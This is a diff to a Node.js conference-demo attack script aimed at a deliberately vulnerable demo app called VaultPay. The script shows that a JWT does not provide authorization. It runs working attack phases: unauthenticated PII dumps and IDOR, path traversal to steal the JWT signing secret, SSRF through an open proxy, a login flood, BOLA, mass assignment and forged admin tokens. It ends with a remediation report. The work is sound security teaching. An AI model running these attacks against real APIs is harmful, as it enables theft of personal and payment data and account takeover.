@@ -3,13 +3,18 @@
  * VaultPay demo attacker — Short Conference Edition
  * =================================================
  *
- * Streamlined 5-phase high-impact conference demo:
- *   1. [Phase 01 · Reset] (optional via --reset)
- *   2. Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) / debug / search)
- *   3. Path traversal on /api/files (steals JWT_SECRET)
- *   4. Open proxy / SSRF on /api/proxy (cloud edge vs app security)
- *   5. Login flood / rate limiting (framework gap)
- *   6. Login, BOLA (Broken Object Level Authorization), admin, mass assignment, & forged admin JWT (climax)
+ * Streamlined high-impact cut of attack.mjs for a ~10 minute slot:
+ *   0. Reset (optional via --reset)
+ *   1. Unauthenticated data theft (user dump / IDOR / search)
+ *   2. Path traversal on /api/files (steals JWT_SECRET — the only secret theft)
+ *   3. Open proxy / SSRF on /api/proxy (cloud edge vs app security)
+ *   4. Login flood / rate limiting (framework gap)
+ *   5. Authn ≠ authz: login, BOLA, admin route, cross-user write, mass assignment
+ *   6. Forged admin JWT (climax) — then [Enter] before the report
+ *
+ * Dropped vs attack.mjs: the /api/debug/config beat in data theft (same secret
+ * as the traversal) and the cloud-metadata (IMDS) probe (up to 8s of dead air,
+ * inconclusive on Workers/Vercel). Run attack.mjs for the full 16-phase version.
  *
  * Usage:
  *   node --no-warnings attack/attackv2.mjs <API_BASE_URL> --drama --projector --reset
@@ -134,14 +139,14 @@ ${c.red}${c.bold}╔════════════════════
 ║   ██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝                               ║
 ║   ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝                                ║
 ║                                                                      ║
-║   JWT ≠ Secure API   ·   Conference 5-Phase Short Edition            ║
+║   JWT ≠ Secure API   ·   Conference Short Edition                    ║
 ║                                                                      ║
 ╚══════════════════════════════════════════════════════════════════════╝${c.reset}
 `);
     console.log(`${c.bold}Target${c.reset}   ${c.cyan}${BASE}${c.reset}`);
     console.log(`${c.bold}Started${c.reset}  ${new Date().toISOString()}`);
     console.log(
-        `${c.bold}Claim${c.reset}   JWT authenticates signed claims; authorization and safe application behavior still require explicit controls.`
+        `${c.bold}Claim${c.reset}    JWT authenticates signed claims.\n         Authorization and safe app behavior still need explicit controls.`
     );
     console.log(
         `${c.bold}Flags${c.reset}    wire=${showWire ? "on" : "off"}  verbose=${verbose ? "on" : "off"}  drama=${drama ? "Enter" : "off"}  projector=${projector ? "on" : "off"}  flood=${skipFlood ? "off" : "on"}  reset=${doReset ? "on" : "off"}  gate=${gateToken ? "on" : "off"}  internal=${internalService || "none"}`
@@ -198,7 +203,8 @@ function info(msg) {
 
 function loot(label, value) {
     const raw = String(value ?? "");
-    const v = raw.length > 200 ? raw.slice(0, 200) + "…" : raw;
+    const max = projector ? 96 : 200;
+    const v = raw.length > max ? raw.slice(0, max) + "…" : raw;
     console.log(
         `  ${c.bgRed}${c.white}${c.bold} LOOT ${c.reset} ${c.yellow}${c.bold}${label}${c.reset}  ${v}`
     );
@@ -227,6 +233,12 @@ function scoreboard() {
     const high = by.HIGH || 0;
     const med = by.MEDIUM || 0;
     const infoN = by.INFO || 0;
+    if (projector) {
+        console.log(
+            `  ── ${c.red}${crit} critical${c.reset} · ${c.yellow}${high} high${c.reset} · loot: users=${stolen.users.length} orders=${stolen.orders.length} secret=${stolen.jwtSecret ? "YES" : "no"}`
+        );
+        return;
+    }
     console.log(
         `  ${c.dim}── scoreboard (cumulative finding records): ${c.red}${crit} critical${c.dim} · ${c.yellow}${high} high${c.dim} · ${c.blue}${med} medium${c.dim} · ${infoN} info · loot users=${stolen.users.length} orders=${stolen.orders.length} secret=${stolen.jwtSecret ? "YES" : "no"}${c.reset}`
     );
@@ -397,7 +409,7 @@ function record(severity, title, detail, meta = {}) {
     };
     stolen.findings.push(entry);
     finding(severity, title, entry);
-    if (detail) info(detail);
+    if (detail && !projector) info(detail);
     scoreboard();
 }
 
@@ -408,7 +420,7 @@ function notePlatform(title, detail) {
 }
 
 // ---------------------------------------------------------------------------
-// Selected High-Impact Phases (Reset + 12, 07, 09, 06, 16)
+// Selected high-impact phases (attack.mjs phases 12, 07, 09, 06, 16 — 16 split in two)
 // ---------------------------------------------------------------------------
 
 /**
@@ -430,11 +442,11 @@ async function phaseReset() {
 }
 
 /**
- * PHASE 12 · Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) / debug / search)
+ * Unauthenticated data theft (users / IDOR / search) — attack.mjs phase 12 minus the debug beat
  */
 async function phaseUnauthDataTheft() {
-    step("Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) / debug / search)");
-    intent("JWT claim: no password, no token — full PII (Personally Identifiable Information). Authn was never applied.");
+    step("Unauthenticated data theft (users / IDOR / search)");
+    intent("No password, no token — full PII (personally identifiable information). Authn was never applied.");
 
     narrate("Dumping /api/users with zero Authorization header…");
     const usersRes = await http("GET", "/api/users", { label: "user-dump" });
@@ -461,44 +473,29 @@ async function phaseUnauthDataTheft() {
     narrate(`IDOR (Insecure Direct Object Reference): fetch /api/users/${id} still without auth…`);
     const one = await http("GET", `/api/users/${id}`, { label: "idor-user" });
     if (one.status === 200 && one.json?.user?.ssn) {
-        bad(`Full PII (Personally Identifiable Information) for user #${id}`);
+        bad(`Full record for user #${id} — just by changing the id`);
         loot("SSN", one.json.user.ssn);
         loot("card", one.json.user.cardNumber);
         loot("CVV", one.json.user.cardCvv);
         loot("note", one.json.user.internalNote);
         record(
             "CRITICAL",
-            "IDOR (Insecure Direct Object Reference) on /api/users/:id without auth",
+            "IDOR on /api/users/:id without auth",
             "Walk the id space — no auth, no ownership check",
             { kind: "app-code", owasp: "API1" }
         );
     }
 
-    narrate("Checking leftover debug endpoint…");
-    const dbg = await http("GET", "/api/debug/config", { label: "debug-leak" });
-    if (dbg.status === 200 && dbg.json?.jwtSecret) {
-        stolen.jwtSecret = dbg.json.jwtSecret;
-        bad("Debug config is public");
-        loot("JWT_SECRET", stolen.jwtSecret);
-        loot("featureFlags", JSON.stringify(dbg.json.featureFlags || {}));
-        record(
-            "CRITICAL",
-            "Debug endpoint leaks JWT signing secret",
-            "App left /api/debug/config public — forge any identity next",
-            { kind: "app-code", owasp: "API8" }
-        );
-    }
-
-    narrate('Searching PII (Personally Identifiable Information) with q="oslo"…');
+    narrate('Searching PII with q="oslo"…');
     const search = await http("GET", "/api/search?q=oslo", { label: "pii-search" });
     if (search.status === 200 && (search.json?.results?.length || 0) > 0) {
-        bad(`Search returned ${search.json.results.length} PII (Personally Identifiable Information) hits without auth`);
+        bad(`Search returned ${search.json.results.length} PII hits without auth`);
         for (const r of search.json.results) {
             loot(r.email, `${r.name} | ${r.address} | ${r.ssn}`);
         }
         record(
             "HIGH",
-            "Unauthenticated PII (Personally Identifiable Information) search",
+            "Unauthenticated PII search",
             "Search exposes sensitive object properties without filtering (API3), and lacks function access control (also API5).",
             { kind: "app-code", owasp: "API3" }
         );
@@ -554,66 +551,6 @@ async function phasePathTraversal() {
     } else {
         ok("Path traversal did not yield secrets (unexpected for this demo)");
     }
-}
-
-/** Classic cloud IMDS URL (demo teaching target — may fail on CF/Vercel). */
-const AWS_IMDS_URL = "http://169.254.169.254/latest/meta-data/";
-
-async function probeMetadataEgress(opts = { proxyAlive: true }) {
-    if (!opts.proxyAlive) {
-        info("Skipping IMDS probe — open proxy endpoint not available");
-        return;
-    }
-    narrate(
-        `Cloud-metadata style egress: open-proxy fetch of ${AWS_IMDS_URL} (classic EC2 IMDS — teaching target)…`
-    );
-    let meta;
-    try {
-        meta = await http("GET", `/api/proxy?url=${encodeURIComponent(AWS_IMDS_URL)}`, {
-            timeoutMs: 8_000,
-            label: "ssrf-imds",
-        });
-    } catch (err) {
-        info(`IMDS probe transport error: ${err.message}`);
-        info("Metadata reachability and the reason for failure are unconfirmed; no metadata finding recorded.");
-        return;
-    }
-
-    const body = (meta.text || "").replace(/\s+/g, " ").trim();
-    const proxyReportedFail =
-        meta.status === 502 ||
-        meta.status === 400 ||
-        /Upstream fetch failed|ENOTFOUND|ECONNREFUSED|timeout|EHOSTUNREACH|ECONNRESET/i.test(body);
-
-    const looksLikeImds =
-        meta.status === 200 &&
-        body.length > 0 &&
-        !proxyReportedFail &&
-        (/ami-id|instance-id|iam\/|meta-data|local-ipv4|public-ipv4|hostname/i.test(body) ||
-            /^(ami-|i-)[a-z0-9-]+/i.test(body));
-
-    if (looksLikeImds) {
-        bad("Metadata-shaped response returned for link-local URL");
-        loot("imds-snippet", body.slice(0, 160));
-        record(
-            "HIGH",
-            "SSRF returns metadata-shaped content from link-local URL",
-            "Response resembles metadata; this probe does not authenticate its source or retrieve usable IAM credentials. EC2 credential exposure depends on IMDS configuration and an attached role.",
-            { kind: "app-code", owasp: "API7" }
-        );
-        return;
-    }
-
-    if (meta.status === 200 && body.length > 20 && !proxyReportedFail) {
-        info(`Metadata URL returned HTTP 200 (${body.length} B); upstream identity unconfirmed`);
-        loot("imds-body", body.slice(0, 120));
-        info("No metadata-specific vulnerability recorded from an unrecognized response.");
-        return;
-    }
-
-    info(
-        `IMDS probe → status=${meta.status}; metadata reachability not demonstrated. Source inspection shows no app URL allowlist, but this response does not establish platform egress policy.`
-    );
 }
 
 async function probeInternalPivot(opts = { proxyAlive: true }) {
@@ -684,7 +621,7 @@ async function probeInternalPivot(opts = { proxyAlive: true }) {
 async function phaseSsrfProxy() {
     step("Open proxy / SSRF on /api/proxy (no login)");
     intent(
-        "Unrestricted server-side fetch(user URL): self-hit, arbitrary external, and cloud-metadata class. No egress policy in Express core — you must add one."
+        "The server fetches any URL we hand it. Express has no egress policy — you must add one."
     );
     let proxyAlive = true;
     const loop = `${BASE}/api/debug/config`;
@@ -698,8 +635,10 @@ async function phaseSsrfProxy() {
         loot("ssrf-body", res.text.slice(0, 240));
         try {
             const j = JSON.parse(res.text);
-            if (j.jwtSecret) {
-                stolen.jwtSecret = stolen.jwtSecret || j.jwtSecret;
+            if (j.jwtSecret && stolen.jwtSecret) {
+                info(`Signing secret again ("${j.jwtSecret}") — a second route to the same key`);
+            } else if (j.jwtSecret) {
+                stolen.jwtSecret = j.jwtSecret;
                 loot("JWT_SECRET", stolen.jwtSecret);
             }
         } catch {
@@ -767,7 +706,6 @@ async function phaseSsrfProxy() {
         }
     }
 
-    await probeMetadataEgress({ proxyAlive });
     await probeInternalPivot({ proxyAlive });
 }
 
@@ -777,7 +715,7 @@ async function phaseSsrfProxy() {
 async function phaseNoRateLimitFlood() {
     step("Login flood — observed authentication throttling");
     intent(
-        "Express core has no login rate limiter. This bounded batch checks wrong-password attempts on one account; it cannot rule out other throttle thresholds or time windows."
+        "Express core has no login rate limiter. One bounded batch of wrong passwords on one account."
     );
     if (skipFlood) {
         info("Skipped (--skip-flood)");
@@ -850,10 +788,11 @@ async function demoLogin() {
 }
 
 /**
- * PHASE 16 · Login, BOLA (Broken Object Level Authorization), admin, mass assignment, JWT forge
+ * Authn ≠ authz — login, BOLA, admin route, cross-user write, mass assignment
+ * (first half of attack.mjs phase 16)
  */
-async function phaseAuthzAndForgery() {
-    step("Login, BOLA (Broken Object Level Authorization), admin, mass assignment, JWT forge");
+async function phaseAuthz() {
+    step("Authn ≠ authz — one ordinary login, then everything");
     intent("JWT proves someone logged in. It does not decide what they may read or write.");
 
     const loginOk = await demoLogin();
@@ -877,18 +816,18 @@ async function phaseAuthzAndForgery() {
             stolen.orders.map((o) => o.userId).filter((id) => id !== loginOk.user.id)
         );
         if (others.size > 0 && loginOk.user.role !== "admin") {
-            bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users (BOLA (Broken Object Level Authorization))`);
+            bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users — BOLA (Broken Object Level Authorization)`);
             for (const o of stolen.orders.slice(0, 8)) {
                 loot(`Order #${o.id}`, `userId=${o.userId} ${o.merchant} $${o.amount} ····${o.cardLast4}`);
             }
             record(
                 "CRITICAL",
-                "BOLA (Broken Object Level Authorization) on /api/orders",
+                "BOLA on /api/orders",
                 "Authn present, authz missing — any login reads every order",
                 { kind: "app-code", owasp: "API1" }
             );
         } else if (loginOk.user.role === "admin") {
-            info("Admin fallback cannot establish unauthorized cross-user order access; no BOLA (Broken Object Level Authorization) finding counted");
+            info("Admin fallback cannot establish unauthorized cross-user order access; no BOLA finding counted");
         } else {
             ok(`Orders scoped to self (${stolen.orders.length} order(s) for user #${loginOk.user.id})`);
         }
@@ -904,21 +843,21 @@ async function phaseAuthzAndForgery() {
             label: "admin-stats",
         });
         if (stats.status === 200 && Array.isArray(stats.json?.accounts) && stats.json.accounts.length > 0) {
-            bad(`Admin dashboard open to a non-admin identity - ${stats.json.accounts.length} accounts`);
+            bad(`Admin dashboard open to a non-admin — BFLA (Broken Function Level Authorization) — ${stats.json.accounts.length} accounts`);
             for (const account of stats.json.accounts.slice(0, 6)) {
                 loot(account.email, `password=${account.password} ssn=${account.ssn}`);
             }
             record(
                 "CRITICAL",
                 "Admin route accessible to a non-admin identity",
-                "Observed before role mutation: a regular user's token accesses the administrative account dump (BFLA (Broken Function Level Authorization)).",
+                "Observed before role mutation: a regular user's token accesses the administrative account dump (BFLA).",
                 { kind: "app-code", owasp: "API5" }
             );
         } else {
-            info(`Non-admin access probe returned ${stats.status}; BFLA (Broken Function Level Authorization) not confirmed`);
+            info(`Non-admin access probe returned ${stats.status}; BFLA not confirmed`);
         }
     } else {
-        info("Login fallback is already admin; skip non-admin BFLA (Broken Function Level Authorization) and privilege-escalation claims");
+        info("Login fallback is already admin; skip non-admin BFLA and privilege-escalation claims");
     }
 
     const victimId = escId === 2 ? 1 : 2;
@@ -967,6 +906,14 @@ async function phaseAuthzAndForgery() {
     } else {
         info(`Mass assignment → ${escalate.status}`);
     }
+}
+
+/**
+ * Forged admin JWT (climax) — second half of attack.mjs phase 16. Needs no login.
+ */
+async function phaseForgery() {
+    step("Forge an admin JWT with the stolen secret");
+    intent("The signature only proves who holds the key. We hold the key.");
 
     narrate('Trying the classic "alg": "none" unsigned-token forgery…');
     const noneToken = `${b64url(JSON.stringify({ alg: "none", typ: "JWT" }))}.${b64url(
@@ -988,7 +935,7 @@ async function phaseAuthzAndForgery() {
         ok(
             `alg:none rejected (${noneRes.status}) — jsonwebtoken v9 pins HS256/384/512 for string secrets, not the app`
         );
-        info("You did not configure this. A library maintainer did.  ");
+        info("You did not configure this. A library maintainer did.");
     } else {
         info(`Unsigned-token probe inconclusive (${noneRes.status}); signature rejection not confirmed`);
     }
@@ -1041,8 +988,8 @@ ${c.bold}${c.green}╔═══════════════════�
 ╚══════════════════════════════════════════════════════════════════════╝${c.reset}
 `);
     console.log(`  ${c.red}${c.bold}(app-code)${c.reset}  — fix in your handlers (framework will not invent these)
-    · Ownership (BOLA (Broken Object Level Authorization)/IDOR (Insecure Direct Object Reference)): order.userId === req.user.sub — on every read AND write
-    · Roles (BFLA (Broken Function Level Authorization)): requireRole("admin") — login alone is not enough
+    · Ownership (BOLA/IDOR): order.userId === req.user.sub — on every read AND write
+    · Roles (BFLA): requireRole("admin") — login alone is not enough
     · Request field allowlist — never merge raw JSON into user/role
     · Response field allowlist — pick what you return; no ssn/cardNumber leaving endpoints
     · Path jail on any file path from user input
@@ -1096,7 +1043,7 @@ ${c.bold}${c.red}╔════════════════════
     console.log(`\n  ${c.bold}All findings:${c.reset}`);
     for (const f of stolen.findings) {
         finding(f.severity, f.title, f);
-        if (f.detail) info(f.detail);
+        if (f.detail && !projector) info(f.detail);
     }
 
     if (stolen.platformNotes.length) {
@@ -1144,14 +1091,8 @@ ${c.bold}${c.red}╔════════════════════
 }
 
 /**
- * Orchestrator — Call order for the 5 selected high-impact phases:
- *   1. phaseReset (if --reset)
- *   2. phaseUnauthDataTheft (Phase 12)
- *   3. phasePathTraversal   (Phase 07)
- *   4. phaseSsrfProxy       (Phase 09)
- *   5. phaseNoRateLimitFlood(Phase 06)
- *   6. phaseAuthzAndForgery (Phase 16)
- *   —— printReport
+ * Orchestrator — [Enter] (--drama) between every phase and before the report,
+ * so the forged-admin result stays on screen until you release it.
  */
 async function main() {
     banner();
@@ -1165,7 +1106,10 @@ async function main() {
     await dramaPause();
     await phaseNoRateLimitFlood();
     await dramaPause();
-    await phaseAuthzAndForgery();
+    await phaseAuthz();
+    await dramaPause();
+    await phaseForgery();
+    await dramaPause();
     printReport();
 }
 
